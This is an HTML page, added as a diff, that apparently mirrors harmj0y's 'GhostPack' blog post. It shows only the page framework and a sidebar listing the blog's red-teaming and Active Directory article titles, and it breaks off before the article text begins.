@@ -1,0 +1,327 @@
+<!doctype html>
+<html lang="en"><head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>GhostPack | Raw2Crawl</title><meta name="description" content="Security testing documentation.">
+<link rel="canonical" href="https://raw2crawl.github.io/en/harmj0y/Red-Teaming/ghostpack/"><link rel="icon" href="/assets/icon.svg" type="image/svg+xml">
+<meta name="color-scheme" content="light dark"><meta name="theme-color" content="#202020">
+<script>try{var t=localStorage.getItem('raw2crawl-theme');document.documentElement.dataset.theme=t==='light'||t==='dark'?t:matchMedia('(prefers-color-scheme: dark)').matches?'dark':'light'}catch(e){document.documentElement.dataset.theme=matchMedia('(prefers-color-scheme: dark)').matches?'dark':'light'}</script>
+<link rel="stylesheet" href="/assets/site.css?v=b655f120c851"><script src="/assets/site.js?v=9a5393417b9c" defer></script>
+</head><body id="top" class="documentation blog-document">
+<a class="skip-link" href="#main-content">Skip to content</a>
+<header class="site-header"><a class="brand" href="/en/">Raw2Crawl<span class="brand-divider" aria-hidden="true">/</span><span class="brand-label">Documentation</span></a>
+<div class="header-actions"><span class="language" aria-label="Language: English">EN</span><button id="theme-toggle" type="button" aria-label="Switch color theme">Theme</button></div></header>
+<div class="mobile-toolbar"><button id="contents-toggle" type="button" aria-controls="doc-sidebar" aria-expanded="false">Contents</button><span>harmj0y / Red Teaming</span></div><div class="docs-layout"><aside id="doc-sidebar" class="sidebar" aria-label="Blog contents"><div class="sidebar-book"><span class="eyebrow">harmj0y</span><a href="/en/harmj0y/">Blog archive</a><span class="edition">83 articles · 10 categories</span></div><nav class="wstg-nav series-nav" aria-label="Blog categories and articles"><label for="harmjoy-filter" class="wstg-nav-filter-label">Search contents</label><input id="harmjoy-filter" type="search" class="wstg-nav-filter" placeholder="Find an article…" autocomplete="off"><div class="wstg-nav-filter-controls"><button type="button" class="wstg-nav-filter-clear" hidden>Clear</button><p class="wstg-nav-filter-count" aria-live="polite" hidden></p></div><div class="wstg-nav-controls"><button type="button" data-wstg-expand>Expand all</button><button type="button" data-wstg-collapse>Collapse all</button></div><ul class="wstg-nav-list"><li class="wstg-nav-item" data-title="All categories"><a data-nav-url="/en/harmj0y/" href="/en/harmj0y/">All categories</a></li><li class="wstg-nav-item" data-title="ActiveDirectory"><details><summary><span class="wstg-nav-summary-row"><span class="wstg-nav-chevron" aria-hidden="true"></span><a data-nav-url="/en/harmj0y/ActiveDirectory/" href="/en/harmj0y/ActiveDirectory/">ActiveDirectory (10)</a></span></summary><ul><li class="wstg-nav-item" data-title="Certified Pre-Owned"><a data-nav-url="/en/harmj0y/ActiveDirectory/certified-pre-owned/" href="/en/harmj0y/ActiveDirectory/certified-pre-owned/">Certified Pre-Owned</a></li><li class="wstg-nav-item" data-title="A Case Study in Wagging the Dog: Computer Takeover"><a data-nav-url="/en/harmj0y/ActiveDirectory/a-case-study-in-wagging-the-dog-computer-takeover/" href="/en/harmj0y/ActiveDirectory/a-case-study-in-wagging-the-dog-computer-takeover/">A Case Study in Wagging the Dog: Computer Takeover</a></li><li class="wstg-nav-item" data-title="Remote Hash Extraction On Demand Via Host Security Descriptor Modification"><a data-nav-url="/en/harmj0y/ActiveDirectory/remote-hash-extraction-on-demand-via-host-security-descriptor-modification/" href="/en/harmj0y/ActiveDirectory/remote-hash-extraction-on-demand-via-host-security-descriptor-modification/">Remote Hash Extraction On Demand Via Host Security Descriptor Modification</a></li><li class="wstg-nav-item" data-title="A Guide to Attacking Domain Trusts"><a data-nav-url="/en/harmj0y/ActiveDirectory/a-guide-to-attacking-domain-trusts/" href="/en/harmj0y/ActiveDirectory/a-guide-to-attacking-domain-trusts/">A Guide to Attacking Domain Trusts</a></li><li class="wstg-nav-item" data-title="Hunting With Active Directory Replication Metadata"><a data-nav-url="/en/harmj0y/ActiveDirectory/hunting-with-active-directory-replication-metadata/" href="/en/harmj0y/ActiveDirectory/hunting-with-active-directory-replication-metadata/">Hunting With Active Directory Replication Metadata</a></li><li class="wstg-nav-item" data-title="A Pentester’s Guide to Group Scoping"><a data-nav-url="/en/harmj0y/ActiveDirectory/a-pentesters-guide-to-group-scoping/" href="/en/harmj0y/ActiveDirectory/a-pentesters-guide-to-group-scoping/">A Pentester’s Guide to Group Scoping</a></li><li class="wstg-nav-item" data-title="Targeted Kerberoasting"><a data-nav-url="/en/harmj0y/ActiveDirectory/targeted-kerberoasting/" href="/en/harmj0y/ActiveDirectory/targeted-kerberoasting/">Targeted Kerberoasting</a></li><li class="wstg-nav-item" data-title="Roasting AS-REPs"><a data-nav-url="/en/harmj0y/ActiveDirectory/roasting-as-reps/" href="/en/harmj0y/ActiveDirectory/roasting-as-reps/">Roasting AS-REPs</a></li><li class="wstg-nav-item" data-title="The Most Dangerous User Right You (Probably) Have Never Heard Of"><a data-nav-url="/en/harmj0y/ActiveDirectory/the-most-dangerous-user-right-you-probably-have-never-heard-of/" href="/en/harmj0y/ActiveDirectory/the-most-dangerous-user-right-you-probably-have-never-heard-of/">The Most Dangerous User Right You (Probably) Have Never Heard Of</a></li><li class="wstg-nav-item" data-title="S4U2Pwnage"><a data-nav-url="/en/harmj0y/ActiveDirectory/s4u2pwnage/" href="/en/harmj0y/ActiveDirectory/s4u2pwnage/">S4U2Pwnage</a></li></ul></details></li><li class="wstg-nav-item" data-title="Defense"><details><summary><span class="wstg-nav-summary-row"><span class="wstg-nav-chevron" aria-hidden="true"></span><a data-nav-url="/en/harmj0y/Defense/" href="/en/harmj0y/Defense/">Defense (2)</a></span></summary><ul><li class="wstg-nav-item" data-title="Hunting With Active Directory Replication Metadata"><a data-nav-url="/en/harmj0y/ActiveDirectory/hunting-with-active-directory-replication-metadata/" href="/en/harmj0y/ActiveDirectory/hunting-with-active-directory-replication-metadata/">Hunting With Active Directory Replication Metadata</a></li><li class="wstg-nav-item" data-title="PowerSCCM"><a data-nav-url="/en/harmj0y/Defense/powersccm/" href="/en/harmj0y/Defense/powersccm/">PowerSCCM</a></li></ul></details></li><li class="wstg-nav-item" data-title="Empire"><details><summary><span class="wstg-nav-summary-row"><span class="wstg-nav-chevron" aria-hidden="true"></span><a data-nav-url="/en/harmj0y/Empire/" href="/en/harmj0y/Empire/">Empire (11)</a></span></summary><ul><li class="wstg-nav-item" data-title="Empire Fails"><a data-nav-url="/en/harmj0y/Empire/empire-fails/" href="/en/harmj0y/Empire/empire-fails/">Empire Fails</a></li><li class="wstg-nav-item" data-title="The Empire Strikes Back"><a data-nav-url="/en/harmj0y/Empire/the-empire-strikes-back/" href="/en/harmj0y/Empire/the-empire-strikes-back/">The Empire Strikes Back</a></li><li class="wstg-nav-item" data-title="Empire’s RESTful API"><a data-nav-url="/en/harmj0y/Empire/empires-restful-api/" href="/en/harmj0y/Empire/empires-restful-api/">Empire’s RESTful API</a></li><li class="wstg-nav-item" data-title="Empire 1.5"><a data-nav-url="/en/harmj0y/Empire/empire-1-5/" href="/en/harmj0y/Empire/empire-1-5/">Empire 1.5</a></li><li class="wstg-nav-item" data-title="Empire’s CLI"><a data-nav-url="/en/harmj0y/Empire/empires-cli/" href="/en/harmj0y/Empire/empires-cli/">Empire’s CLI</a></li><li class="wstg-nav-item" data-title="Nothing Lasts Forever: Persistence with Empire"><a data-nav-url="/en/harmj0y/Empire/nothing-lasts-forever-persistence-with-empire/" href="/en/harmj0y/Empire/nothing-lasts-forever-persistence-with-empire/">Nothing Lasts Forever: Persistence with Empire</a></li><li class="wstg-nav-item" data-title="Expanding Your Empire"><a data-nav-url="/en/harmj0y/Empire/expanding-your-empire/" href="/en/harmj0y/Empire/expanding-your-empire/">Expanding Your Empire</a></li><li class="wstg-nav-item" data-title="Empire 1.4"><a data-nav-url="/en/harmj0y/Empire/empire-1-4/" href="/en/harmj0y/Empire/empire-1-4/">Empire 1.4</a></li><li class="wstg-nav-item" data-title="Empire 1.3"><a data-nav-url="/en/harmj0y/Empire/empire-1-3/" href="/en/harmj0y/Empire/empire-1-3/">Empire 1.3</a></li><li class="wstg-nav-item" data-title="Empire 1.2"><a data-nav-url="/en/harmj0y/Empire/empire-1-2/" href="/en/harmj0y/Empire/empire-1-2/">Empire 1.2</a></li><li class="wstg-nav-item" data-title="Empire 1.1"><a data-nav-url="/en/harmj0y/Empire/empire-1-1/" href="/en/harmj0y/Empire/empire-1-1/">Empire 1.1</a></li></ul></details></li><li class="wstg-nav-item" data-title="EmPyre"><details><summary><span class="wstg-nav-summary-row"><span class="wstg-nav-chevron" aria-hidden="true"></span><a data-nav-url="/en/harmj0y/EmPyre/" href="/en/harmj0y/EmPyre/">EmPyre (2)</a></span></summary><ul><li class="wstg-nav-item" data-title="OS X Office Macros with EmPyre"><a data-nav-url="/en/harmj0y/EmPyre/os-x-office-macros-with-empyre/" href="/en/harmj0y/EmPyre/os-x-office-macros-with-empyre/">OS X Office Macros with EmPyre</a></li><li class="wstg-nav-item" data-title="Building an EmPyre with Python"><a data-nav-url="/en/harmj0y/EmPyre/building-an-empyre-with-python/" href="/en/harmj0y/EmPyre/building-an-empyre-with-python/">Building an EmPyre with Python</a></li></ul></details></li><li class="wstg-nav-item" data-title="Informational"><details><summary><span class="wstg-nav-summary-row"><span class="wstg-nav-chevron" aria-hidden="true"></span><a data-nav-url="/en/harmj0y/Informational/" href="/en/harmj0y/Informational/">Informational (3)</a></span></summary><ul><li class="wstg-nav-item" data-title="A Three Year Retrospective"><a data-nav-url="/en/harmj0y/Informational/a-three-year-retrospective/" href="/en/harmj0y/Informational/a-three-year-retrospective/">A Three Year Retrospective</a></li><li class="wstg-nav-item" data-title="Empire, Meterpreter, and Offensive Half-life"><a data-nav-url="/en/harmj0y/Informational/empire-meterpreter-and-offensive-half-life/" href="/en/harmj0y/Informational/empire-meterpreter-and-offensive-half-life/">Empire, Meterpreter, and Offensive Half-life</a></li><li class="wstg-nav-item" data-title="Cracking the Perimeter (CTP) and OSCE review"><a data-nav-url="/en/harmj0y/Informational/cracking-the-perimeter-ctp-and-osce-review/" href="/en/harmj0y/Informational/cracking-the-perimeter-ctp-and-osce-review/">Cracking the Perimeter (CTP) and OSCE review</a></li></ul></details></li><li class="wstg-nav-item" data-title="Penetesting"><details><summary><span class="wstg-nav-summary-row"><span class="wstg-nav-chevron" aria-hidden="true"></span><a data-nav-url="/en/harmj0y/Penetesting/" href="/en/harmj0y/Penetesting/">Penetesting (7)</a></span></summary><ul><li class="wstg-nav-item" data-title="Push it, Push it Real Good"><a data-nav-url="/en/harmj0y/Red-Teaming/push-it-push-it-real-good/" href="/en/harmj0y/Red-Teaming/push-it-push-it-real-good/">Push it, Push it Real Good</a></li><li class="wstg-nav-item" data-title="“I Hunt Sys Admins”"><a data-nav-url="/en/harmj0y/Penetesting/i-hunt-sysadmins/" href="/en/harmj0y/Penetesting/i-hunt-sysadmins/">“I Hunt Sys Admins”</a></li><li class="wstg-nav-item" data-title="Mining a Domain’s Worth of Data With PowerShell"><a data-nav-url="/en/harmj0y/Powershell/mining-a-domains-worth-of-data-with-powershell/" href="/en/harmj0y/Powershell/mining-a-domains-worth-of-data-with-powershell/">Mining a Domain’s Worth of Data With PowerShell</a></li><li class="wstg-nav-item" data-title="Dumping a Domain’s Worth of Passwords With Mimikatz pt. 2"><a data-nav-url="/en/harmj0y/Powershell/dumping-a-domains-worth-of-passwords-with-mimikatz-pt-2/" href="/en/harmj0y/Powershell/dumping-a-domains-worth-of-passwords-with-mimikatz-pt-2/">Dumping a Domain’s Worth of Passwords With Mimikatz pt. 2</a></li><li class="wstg-nav-item" data-title="The Case of a Stubborn ntds.dit"><a data-nav-url="/en/harmj0y/Red-Teaming/the-case-of-a-stubborn-ntds-dit/" href="/en/harmj0y/Red-Teaming/the-case-of-a-stubborn-ntds-dit/">The Case of a Stubborn ntds.dit</a></li><li class="wstg-nav-item" data-title="Finding Local Admin with the Veil-Framework"><a data-nav-url="/en/harmj0y/Penetesting/finding-local-admin-with-the-veil-framework/" href="/en/harmj0y/Penetesting/finding-local-admin-with-the-veil-framework/">Finding Local Admin with the Veil-Framework</a></li><li class="wstg-nav-item" data-title="Pass-the-Hash is Dead: Long Live Pass-the-Hash"><a data-nav-url="/en/harmj0y/Penetesting/pass-the-hash-is-dead-long-live-pass-the-hash/" href="/en/harmj0y/Penetesting/pass-the-hash-is-dead-long-live-pass-the-hash/">Pass-the-Hash is Dead: Long Live Pass-the-Hash</a></li></ul></details></li><li class="wstg-nav-item" data-title="Powershell"><details><summary><span class="wstg-nav-summary-row"><span class="wstg-nav-chevron" aria-hidden="true"></span><a data-nav-url="/en/harmj0y/Powershell/" href="/en/harmj0y/Powershell/">Powershell (22)</a></span></summary><ul><li class="wstg-nav-item" data-title="The PowerView PowerUsage Series #5"><a data-nav-url="/en/harmj0y/Powershell/the-powerview-powerusage-series-5/" href="/en/harmj0y/Powershell/the-powerview-powerusage-series-5/">The PowerView PowerUsage Series #5</a></li><li class="wstg-nav-item" data-title="The PowerView PowerUsage Series #4"><a data-nav-url="/en/harmj0y/Powershell/the-powerview-powerusage-series-4/" href="/en/harmj0y/Powershell/the-powerview-powerusage-series-4/">The PowerView PowerUsage Series #4</a></li><li class="wstg-nav-item" data-title="The PowerView PowerUsage Series #3"><a data-nav-url="/en/harmj0y/Powershell/the-powerview-powerusage-series-3/" href="/en/harmj0y/Powershell/the-powerview-powerusage-series-3/">The PowerView PowerUsage Series #3</a></li><li class="wstg-nav-item" data-title="The PowerView PowerUsage Series #2"><a data-nav-url="/en/harmj0y/Powershell/the-powerview-powerusage-series-2/" href="/en/harmj0y/Powershell/the-powerview-powerusage-series-2/">The PowerView PowerUsage Series #2</a></li><li class="wstg-nav-item" data-title="The PowerView PowerUsage Series #1"><a data-nav-url="/en/harmj0y/Powershell/the-powerview-powerusage-series-1/" href="/en/harmj0y/Powershell/the-powerview-powerusage-series-1/">The PowerView PowerUsage Series #1</a></li><li class="wstg-nav-item" data-title="Make PowerView Great Again"><a data-nav-url="/en/harmj0y/Powershell/make-powerview-great-again/" href="/en/harmj0y/Powershell/make-powerview-great-again/">Make PowerView Great Again</a></li><li class="wstg-nav-item" data-title="Kerberoasting Without Mimikatz"><a data-nav-url="/en/harmj0y/Powershell/kerberoasting-without-mimikatz/" href="/en/harmj0y/Powershell/kerberoasting-without-mimikatz/">Kerberoasting Without Mimikatz</a></li><li class="wstg-nav-item" data-title="Command and Control Using Active Directory"><a data-nav-url="/en/harmj0y/Powershell/command-and-control-using-active-directory/" href="/en/harmj0y/Powershell/command-and-control-using-active-directory/">Command and Control Using Active Directory</a></li><li class="wstg-nav-item" data-title="PowerShell RC4"><a data-nav-url="/en/harmj0y/Powershell/powershell-rc4/" href="/en/harmj0y/Powershell/powershell-rc4/">PowerShell RC4</a></li><li class="wstg-nav-item" data-title="Upgrading PowerUp With PSReflect"><a data-nav-url="/en/harmj0y/Powershell/upgrading-powerup-with-psreflect/" href="/en/harmj0y/Powershell/upgrading-powerup-with-psreflect/">Upgrading PowerUp With PSReflect</a></li><li class="wstg-nav-item" data-title="Running LAPS with PowerView"><a data-nav-url="/en/harmj0y/Powershell/running-laps-with-powerview/" href="/en/harmj0y/Powershell/running-laps-with-powerview/">Running LAPS with PowerView</a></li><li class="wstg-nav-item" data-title="GPP and PowerView"><a data-nav-url="/en/harmj0y/Powershell/gpp-and-powerview/" href="/en/harmj0y/Powershell/gpp-and-powerview/">GPP and PowerView</a></li><li class="wstg-nav-item" data-title="Invoke-BypassUAC"><a data-nav-url="/en/harmj0y/Powershell/invoke-bypassuac/" href="/en/harmj0y/Powershell/invoke-bypassuac/">Invoke-BypassUAC</a></li><li class="wstg-nav-item" data-title="PowerQuinsta"><a data-nav-url="/en/harmj0y/Powershell/powerquinsta/" href="/en/harmj0y/Powershell/powerquinsta/">PowerQuinsta</a></li><li class="wstg-nav-item" data-title="Mining a Domain’s Worth of Data With PowerShell"><a data-nav-url="/en/harmj0y/Powershell/mining-a-domains-worth-of-data-with-powershell/" href="/en/harmj0y/Powershell/mining-a-domains-worth-of-data-with-powershell/">Mining a Domain’s Worth of Data With PowerShell</a></li><li class="wstg-nav-item" data-title="Dumping a Domain’s Worth of Passwords With Mimikatz pt. 2"><a data-nav-url="/en/harmj0y/Powershell/dumping-a-domains-worth-of-passwords-with-mimikatz-pt-2/" href="/en/harmj0y/Powershell/dumping-a-domains-worth-of-passwords-with-mimikatz-pt-2/">Dumping a Domain’s Worth of Passwords With Mimikatz pt. 2</a></li><li class="wstg-nav-item" data-title="PowerShell and Win32 API Access"><a data-nav-url="/en/harmj0y/Powershell/powershell-and-win32-api-access/" href="/en/harmj0y/Powershell/powershell-and-win32-api-access/">PowerShell and Win32 API Access</a></li><li class="wstg-nav-item" data-title="Derbycon + PowerShell Weaponization"><a data-nav-url="/en/harmj0y/Powershell/derbycon-powershell-weaponization/" href="/en/harmj0y/Powershell/derbycon-powershell-weaponization/">Derbycon + PowerShell Weaponization</a></li><li class="wstg-nav-item" data-title="Veil-PowerView: A Usage Guide"><a data-nav-url="/en/harmj0y/Powershell/veil-powerview-a-usage-guide/" href="/en/harmj0y/Powershell/veil-powerview-a-usage-guide/">Veil-PowerView: A Usage Guide</a></li><li class="wstg-nav-item" data-title="PowerUp: A Usage Guide"><a data-nav-url="/en/harmj0y/Powershell/powerup-a-usage-guide/" href="/en/harmj0y/Powershell/powerup-a-usage-guide/">PowerUp: A Usage Guide</a></li><li class="wstg-nav-item" data-title="PowerUp v1.1 – Beyond Service Abuse"><a data-nav-url="/en/harmj0y/Powershell/powerup-v1-1-beyond-service-abuse/" href="/en/harmj0y/Powershell/powerup-v1-1-beyond-service-abuse/">PowerUp v1.1 – Beyond Service Abuse</a></li><li class="wstg-nav-item" data-title="PowerUp"><a data-nav-url="/en/harmj0y/Powershell/powerup/" href="/en/harmj0y/Powershell/powerup/">PowerUp</a></li></ul></details></li><li class="wstg-nav-item" data-title="Python"><details><summary><span class="wstg-nav-summary-row"><span class="wstg-nav-chevron" aria-hidden="true"></span><a data-nav-url="/en/harmj0y/Python/" href="/en/harmj0y/Python/">Python (1)</a></span></summary><ul><li class="wstg-nav-item" data-title="Pwnstaller 1.0"><a data-nav-url="/en/harmj0y/Python/pwnstaller-1-0/" href="/en/harmj0y/Python/pwnstaller-1-0/">Pwnstaller 1.0</a></li></ul></details></li><li class="wstg-nav-item" data-title="Red Teaming"><details open><summary><span class="wstg-nav-summary-row"><span class="wstg-nav-chevron" aria-hidden="true"></span><a data-nav-url="/en/harmj0y/Red-Teaming/" href="/en/harmj0y/Red-Teaming/">Red Teaming (35)</a></span></summary><ul><li class="wstg-nav-item" data-title="Kerberoasting Revisited"><a data-nav-url="/en/harmj0y/Red-Teaming/kerberoasting-revisited/" href="/en/harmj0y/Red-Teaming/kerberoasting-revisited/">Kerberoasting Revisited</a></li><li class="wstg-nav-item" data-title="Not A Security Boundary: Breaking Forest Trusts"><a data-nav-url="/en/harmj0y/Red-Teaming/not-a-security-boundary-breaking-forest-trusts/" href="/en/harmj0y/Red-Teaming/not-a-security-boundary-breaking-forest-trusts/">Not A Security Boundary: Breaking Forest Trusts</a></li><li class="wstg-nav-item" data-title="Another Word on Delegation"><a data-nav-url="/en/harmj0y/Red-Teaming/another-word-on-delegation/" href="/en/harmj0y/Red-Teaming/another-word-on-delegation/">Another Word on Delegation</a></li><li class="wstg-nav-item" data-title="Rubeus – Now With More Kekeo"><a data-nav-url="/en/harmj0y/Red-Teaming/rubeus-now-with-more-kekeo/" href="/en/harmj0y/Red-Teaming/rubeus-now-with-more-kekeo/">Rubeus – Now With More Kekeo</a></li><li class="wstg-nav-item" data-title="From Kekeo to Rubeus"><a data-nav-url="/en/harmj0y/Red-Teaming/from-kekeo-to-rubeus/" href="/en/harmj0y/Red-Teaming/from-kekeo-to-rubeus/">From Kekeo to Rubeus</a></li><li class="wstg-nav-item" data-title="Operational Guidance for Offensive User DPAPI Abuse"><a data-nav-url="/en/harmj0y/Red-Teaming/operational-guidance-for-offensive-user-dpapi-abuse/" href="/en/harmj0y/Red-Teaming/operational-guidance-for-offensive-user-dpapi-abuse/">Operational Guidance for Offensive User DPAPI Abuse</a></li><li class="wstg-nav-item" data-title="GhostPack"><a data-nav-url="/en/harmj0y/Red-Teaming/ghostpack/" href="/en/harmj0y/Red-Teaming/ghostpack/" aria-current="page">GhostPack</a></li><li class="wstg-nav-item" data-title="A Guide to Attacking Domain Trusts"><a data-nav-url="/en/harmj0y/ActiveDirectory/a-guide-to-attacking-domain-trusts/" href="/en/harmj0y/ActiveDirectory/a-guide-to-attacking-domain-trusts/">A Guide to Attacking Domain Trusts</a></li><li class="wstg-nav-item" data-title="Offensive Encrypted Data Storage (DPAPI edition)"><a data-nav-url="/en/harmj0y/Red-Teaming/offensive-encrypted-data-storage-dpapi-edition/" href="/en/harmj0y/Red-Teaming/offensive-encrypted-data-storage-dpapi-edition/">Offensive Encrypted Data Storage (DPAPI edition)</a></li><li class="wstg-nav-item" data-title="Pass-the-Hash Is Dead: Long Live LocalAccountTokenFilterPolicy"><a data-nav-url="/en/harmj0y/Red-Teaming/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy/" href="/en/harmj0y/Red-Teaming/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy/">Pass-the-Hash Is Dead: Long Live LocalAccountTokenFilterPolicy</a></li><li class="wstg-nav-item" data-title="Offensive Encrypted Data Storage"><a data-nav-url="/en/harmj0y/Red-Teaming/offensive-encrypted-data-storage/" href="/en/harmj0y/Red-Teaming/offensive-encrypted-data-storage/">Offensive Encrypted Data Storage</a></li><li class="wstg-nav-item" data-title="Command and Control Using Active Directory"><a data-nav-url="/en/harmj0y/Powershell/command-and-control-using-active-directory/" href="/en/harmj0y/Powershell/command-and-control-using-active-directory/">Command and Control Using Active Directory</a></li><li class="wstg-nav-item" data-title="KeeThief – A Case Study in Attacking KeePass Part 2"><a data-nav-url="/en/harmj0y/Red-Teaming/keethief-a-case-study-in-attacking-keepass-part-2/" href="/en/harmj0y/Red-Teaming/keethief-a-case-study-in-attacking-keepass-part-2/">KeeThief – A Case Study in Attacking KeePass Part 2</a></li><li class="wstg-nav-item" data-title="A Case Study in Attacking KeePass"><a data-nav-url="/en/harmj0y/Red-Teaming/a-case-study-in-attacking-keepass/" href="/en/harmj0y/Red-Teaming/a-case-study-in-attacking-keepass/">A Case Study in Attacking KeePass</a></li><li class="wstg-nav-item" data-title="Where My Admins At? (GPO Edition)"><a data-nav-url="/en/harmj0y/Red-Teaming/where-my-admins-at-gpo-edition/" href="/en/harmj0y/Red-Teaming/where-my-admins-at-gpo-edition/">Where My Admins At? (GPO Edition)</a></li><li class="wstg-nav-item" data-title="Running LAPS with PowerView"><a data-nav-url="/en/harmj0y/Powershell/running-laps-with-powerview/" href="/en/harmj0y/Powershell/running-laps-with-powerview/">Running LAPS with PowerView</a></li><li class="wstg-nav-item" data-title="Abusing GPO Permissions"><a data-nav-url="/en/harmj0y/Red-Teaming/abusing-gpo-permissions/" href="/en/harmj0y/Red-Teaming/abusing-gpo-permissions/">Abusing GPO Permissions</a></li><li class="wstg-nav-item" data-title="Local Group Enumeration"><a data-nav-url="/en/harmj0y/Red-Teaming/local-group-enumeration/" href="/en/harmj0y/Red-Teaming/local-group-enumeration/">Local Group Enumeration</a></li><li class="wstg-nav-item" data-title="Targeted Plaintext Downgrades with PowerView"><a data-nav-url="/en/harmj0y/Red-Teaming/targeted-plaintext-downgrades-with-powerview/" href="/en/harmj0y/Red-Teaming/targeted-plaintext-downgrades-with-powerview/">Targeted Plaintext Downgrades with PowerView</a></li><li class="wstg-nav-item" data-title="Sheets on Sheets on Sheets"><a data-nav-url="/en/harmj0y/Red-Teaming/sheets-on-sheets-on-sheets/" href="/en/harmj0y/Red-Teaming/sheets-on-sheets-on-sheets/">Sheets on Sheets on Sheets</a></li><li class="wstg-nav-item" data-title="Abusing Active Directory Permissions with PowerView"><a data-nav-url="/en/harmj0y/Red-Teaming/abusing-active-directory-permissions-with-powerview/" href="/en/harmj0y/Red-Teaming/abusing-active-directory-permissions-with-powerview/">Abusing Active Directory Permissions with PowerView</a></li><li class="wstg-nav-item" data-title="PowerView 2.0"><a data-nav-url="/en/harmj0y/Red-Teaming/powerview-2-0/" href="/en/harmj0y/Red-Teaming/powerview-2-0/">PowerView 2.0</a></li><li class="wstg-nav-item" data-title="Mimikatz and DCSync and ExtraSids, Oh My"><a data-nav-url="/en/harmj0y/Red-Teaming/mimikatz-and-dcsync-and-extrasids-oh-my/" href="/en/harmj0y/Red-Teaming/mimikatz-and-dcsync-and-extrasids-oh-my/">Mimikatz and DCSync and ExtraSids, Oh My</a></li><li class="wstg-nav-item" data-title="The Trustpocalypse"><a data-nav-url="/en/harmj0y/Red-Teaming/the-trustpocalypse/" href="/en/harmj0y/Red-Teaming/the-trustpocalypse/">The Trustpocalypse</a></li><li class="wstg-nav-item" data-title="Domain Trusts: We’re Not Done Yet"><a data-nav-url="/en/harmj0y/Red-Teaming/domain-trusts-were-not-done-yet/" href="/en/harmj0y/Red-Teaming/domain-trusts-were-not-done-yet/">Domain Trusts: We’re Not Done Yet</a></li><li class="wstg-nav-item" data-title="Identifying Your Prey"><a data-nav-url="/en/harmj0y/Red-Teaming/identifying-your-prey/" href="/en/harmj0y/Red-Teaming/identifying-your-prey/">Identifying Your Prey</a></li><li class="wstg-nav-item" data-title="Push it, Push it Real Good"><a data-nav-url="/en/harmj0y/Red-Teaming/push-it-push-it-real-good/" href="/en/harmj0y/Red-Teaming/push-it-push-it-real-good/">Push it, Push it Real Good</a></li><li class="wstg-nav-item" data-title="Domain Trusts: Why You Should Care"><a data-nav-url="/en/harmj0y/Red-Teaming/domain-trusts-why-you-should-care/" href="/en/harmj0y/Red-Teaming/domain-trusts-why-you-should-care/">Domain Trusts: Why You Should Care</a></li><li class="wstg-nav-item" data-title="Mining a Domain’s Worth of Data With PowerShell"><a data-nav-url="/en/harmj0y/Powershell/mining-a-domains-worth-of-data-with-powershell/" href="/en/harmj0y/Powershell/mining-a-domains-worth-of-data-with-powershell/">Mining a Domain’s Worth of Data With PowerShell</a></li><li class="wstg-nav-item" data-title="Targeted Trojanation"><a data-nav-url="/en/harmj0y/Red-Teaming/targeted-trojanation/" href="/en/harmj0y/Red-Teaming/targeted-trojanation/">Targeted Trojanation</a></li><li class="wstg-nav-item" data-title="The Case of a Stubborn ntds.dit"><a data-nav-url="/en/harmj0y/Red-Teaming/the-case-of-a-stubborn-ntds-dit/" href="/en/harmj0y/Red-Teaming/the-case-of-a-stubborn-ntds-dit/">The Case of a Stubborn ntds.dit</a></li><li class="wstg-nav-item" data-title="Trusts You Might Have Missed"><a data-nav-url="/en/harmj0y/Red-Teaming/trusts-you-might-have-missed/" href="/en/harmj0y/Red-Teaming/trusts-you-might-have-missed/">Trusts You Might Have Missed</a></li><li class="wstg-nav-item" data-title="A Brave New World: Malleable C2"><a data-nav-url="/en/harmj0y/Red-Teaming/a-brave-new-world-malleable-c2/" href="/en/harmj0y/Red-Teaming/a-brave-new-world-malleable-c2/">A Brave New World: Malleable C2</a></li><li class="wstg-nav-item" data-title="Veil-PowerView: A Usage Guide"><a data-nav-url="/en/harmj0y/Powershell/veil-powerview-a-usage-guide/" href="/en/harmj0y/Powershell/veil-powerview-a-usage-guide/">Veil-PowerView: A Usage Guide</a></li><li class="wstg-nav-item" data-title="File Server Triage on Red Team Engagements"><a data-nav-url="/en/harmj0y/Red-Teaming/file-server-triage-on-red-team-engagements/" href="/en/harmj0y/Red-Teaming/file-server-triage-on-red-team-engagements/">File Server Triage on Red Team Engagements</a></li></ul></details></li><li class="wstg-nav-item" data-title="Top Posts"><details><summary><span class="wstg-nav-summary-row"><span class="wstg-nav-chevron" aria-hidden="true"></span><a data-nav-url="/en/harmj0y/Top-Posts/" href="/en/harmj0y/Top-Posts/">Top Posts (5)</a></span></summary><ul><li class="wstg-nav-item" data-title="Certified Pre-Owned"><a data-nav-url="/en/harmj0y/ActiveDirectory/certified-pre-owned/" href="/en/harmj0y/ActiveDirectory/certified-pre-owned/">Certified Pre-Owned</a></li><li class="wstg-nav-item" data-title="Not A Security Boundary: Breaking Forest Trusts"><a data-nav-url="/en/harmj0y/Red-Teaming/not-a-security-boundary-breaking-forest-trusts/" href="/en/harmj0y/Red-Teaming/not-a-security-boundary-breaking-forest-trusts/">Not A Security Boundary: Breaking Forest Trusts</a></li><li class="wstg-nav-item" data-title="Operational Guidance for Offensive User DPAPI Abuse"><a data-nav-url="/en/harmj0y/Red-Teaming/operational-guidance-for-offensive-user-dpapi-abuse/" href="/en/harmj0y/Red-Teaming/operational-guidance-for-offensive-user-dpapi-abuse/">Operational Guidance for Offensive User DPAPI Abuse</a></li><li class="wstg-nav-item" data-title="A Guide to Attacking Domain Trusts"><a data-nav-url="/en/harmj0y/ActiveDirectory/a-guide-to-attacking-domain-trusts/" href="/en/harmj0y/ActiveDirectory/a-guide-to-attacking-domain-trusts/">A Guide to Attacking Domain Trusts</a></li><li class="wstg-nav-item" data-title="Pass-the-Hash Is Dead: Long Live LocalAccountTokenFilterPolicy"><a data-nav-url="/en/harmj0y/Red-Teaming/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy/" href="/en/harmj0y/Red-Teaming/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy/">Pass-the-Hash Is Dead: Long Live LocalAccountTokenFilterPolicy</a></li></ul></details></li></ul></nav></aside><main id="main-content" class="reading-pane"><nav class="breadcrumbs" aria-label="Breadcrumb"><a href="/en/">Library</a><span>/</span><a href="/en/harmj0y/">harmj0y</a><span>/</span><a href="/en/harmj0y/Red-Teaming/">Red Teaming</a></nav><article class="doc-content"><h1 id="article-title">GhostPack</h1><p class="article-meta">harmj0y · <time 